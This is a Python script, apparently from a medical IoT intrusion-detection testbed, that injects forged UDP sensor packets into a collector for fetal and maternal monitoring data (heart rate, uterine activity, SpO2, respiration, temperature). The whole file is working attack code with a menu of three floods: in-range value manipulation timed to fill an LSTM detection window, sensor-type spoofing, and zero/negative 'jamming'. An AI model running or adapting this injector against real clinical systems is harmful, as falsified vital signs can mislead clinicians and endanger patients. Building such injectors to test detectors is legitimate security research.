import socket
import time
import random
import json
from datetime import datetime
from config import TARGET_IP, COLLECTOR_PORT, SENSOR_RANGES

# ======================================================
# IoT ATTACK INJECTOR
# ======================================================

VALID_SENSOR_IDS = ["S1", "S2", "S3", "S4", "S5"]

SENSOR_MAP = {
    "S1": "FHR",
    "S2": "TOCO",
    "S3": "SpO2",
    "S4": "RespRate",
    "S5": "Temp"
}


class IoTAttackInjector:
    def __init__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    def send(self, pkt):
        self.sock.sendto(json.dumps(pkt).encode(), (TARGET_IP, COLLECTOR_PORT))

    def attack_packet(self, sensor_id, sensor_type, value):
        return {
            "sensor_id": sensor_id,
            "sensor_type": sensor_type,
            "value": value,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }

    def send_attack_meta(self):
        self.send({"type": "ATTACK_META", "count": 1})

    # ==================================================
    # ATTACK 1 — MITM DATA MANIPULATION
    # Strategy: Blast ALL 5 sensors every 0.2s for 15s
    # Each sensor alternates low/high within valid range
    # This fills the 60-sample LSTM window with attack data
    # ==================================================
    def mitm_attack(self, duration=15):
        print("\n🔴 MITM DATA MANIPULATION ATTACK")
        self.send_attack_meta()

        # Values stay IN clinical range but jump violently between low/high
        mitm_pairs = {
            "S1": ("FHR",      [115, 155]),
            "S2": ("TOCO",     [5,   92]),
            "S3": ("SpO2",     [95.5, 99.5]),
            "S4": ("RespRate", [13,  19]),
            "S5": ("Temp",     [36.6, 37.4]),
        }

        flip = {sid: 0 for sid in VALID_SENSOR_IDS}
        end = time.time() + duration
        count = 0

        while time.time() < end:
            # Send to ALL 5 sensors in rapid succession
            for sid in VALID_SENSOR_IDS:
                stype, pair = mitm_pairs[sid]
                value = pair[flip[sid]]
                flip[sid] = 1 - flip[sid]

                pkt = self.attack_packet(sid, stype, value)
                self.send(pkt)
                count += 1
                print(f"[MITM] {sid} | {stype} → {value}")

            time.sleep(0.2)  # All 5 sensors blasted every 0.2s

        print(f"✓ MITM attack complete | packets={count}")

    # ==================================================
    # ATTACK 2 — SPOOFING (WRONG SENSOR TYPE)
    # Strategy: Blast ALL 5 sensors with wrong types rapidly
    # ==================================================
    def spoofing_attack(self, duration=15):
        print("\n🔴 SPOOFING ATTACK")
        self.send_attack_meta()

        all_types = list(SENSOR_RANGES.keys())
        end = time.time() + duration
        count = 0

        while time.time() < end:
            # Send to ALL 5 sensors with wrong types
            for sid in VALID_SENSOR_IDS:
                correct_type = SENSOR_MAP[sid]
                wrong_type = random.choice([t for t in all_types if t != correct_type])
                lo, hi = SENSOR_RANGES[wrong_type]
                value = round(random.uniform(lo, hi), 2)

                pkt = self.attack_packet(sid, wrong_type, value)
                self.send(pkt)
                count += 1
                print(f"[SPOOF] {sid} | {wrong_type} → {value}")

            time.sleep(0.2)  # All 5 sensors blasted every 0.2s

        print(f"✓ Spoofing attack complete | packets={count}")

    # ==================================================
    # ATTACK 3 — JAMMING (ZERO / NULL VALUES)
    # Strategy: Blast ALL 5 sensors with 0/-1 rapidly
    # ==================================================
    def jamming_attack(self, duration=15):
        print("\n🔴 JAMMING ATTACK")
        self.send_attack_meta()

        end = time.time() + duration
        count = 0

        while time.time() < end:
            # Jam ALL 5 sensors simultaneously
            for sid in VALID_SENSOR_IDS:
                stype = SENSOR_MAP[sid]
                value = random.choice([0, -1])

                pkt = self.attack_packet(sid, stype, value)
                self.send(pkt)
                count += 1
                print(f"[JAM] {sid} | {stype} → {value}")

            time.sleep(0.2)  # All 5 sensors blasted every 0.2s

        print(f"✓ Jamming attack complete | packets={count}")

    # ==================================================
    # MENU
    # ==================================================
    def menu(self):
        while True:
            print("\n==============================")
            print(" Medical IoT Attack Injector ")
            print("==============================")
            print("1. MITM Manipulation")
            print("2. Spoofing Attack")
            print("3. Jamming Attack")
            print("4. Run ALL")
            print("5. Exit")

            choice = input("Select: ").strip()

            if choice == "1":
                self.mitm_attack()
            elif choice == "2":
                self.spoofing_attack()
            elif choice == "3":
                self.jamming_attack()
            elif choice == "4":
                self.mitm_attack()
                time.sleep(8)
                self.spoofing_attack()
                time.sleep(8)
                self.jamming_attack()
            elif choice == "5":
                break
            else:
                print("Invalid choice")


# ======================================================
# MAIN
# ======================================================
if __name__ == "__main__":
    print("\n🚨 IoT ATTACK INJECTOR")
    print(f"Target: {TARGET_IP}:{COLLECTOR_PORT}")
    injector = IoTAttackInjector()
    injector.menu()